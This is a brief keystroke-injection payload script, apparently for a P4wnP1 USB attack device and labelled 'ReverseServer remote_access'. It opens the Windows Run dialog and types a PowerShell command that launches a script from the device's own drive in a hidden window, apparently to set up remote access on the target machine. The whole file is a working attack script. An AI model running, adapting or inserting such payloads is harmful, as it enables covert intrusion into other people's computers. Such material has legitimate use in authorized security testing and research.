//ReverseServer remote_access
layout('us');		
typingSpeed(0,0)
press("GUI r");
delay(500);
type("powershell -w h \".((gwmi win32_volume -f 'label=''P4WNP1''').Name+'payloads\\ReverseServer\\run.ps1')\"\n")
delay(1000);
